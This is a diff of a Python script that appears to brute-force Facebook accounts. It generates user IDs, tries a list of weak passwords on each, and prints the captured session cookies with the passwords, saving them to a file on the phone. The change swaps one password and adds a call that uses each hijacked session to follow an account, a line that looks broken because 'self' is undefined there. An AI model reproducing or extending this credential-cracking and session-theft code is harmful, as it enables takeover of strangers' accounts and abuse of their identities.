@@ -245,7 +245,7 @@ def i():
         jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m┇ \033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m ┇\033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'203040','708090','0987654','bangla','113355']
+            pwx = [love,'203040','708090','0987654','bangla','Bangladesh']
             uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
@@ -290,10 +290,11 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃1;33mCOOKIES┃🍪┃ : \033[38;5;46m'+coki+ ' ')  
+                print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃COOKIES┃🍪┃ : \033[38;5;46m'+coki+ ' ')  
                 cek_apk(session,coki)
                 open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
+                follow(self, session, coki)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
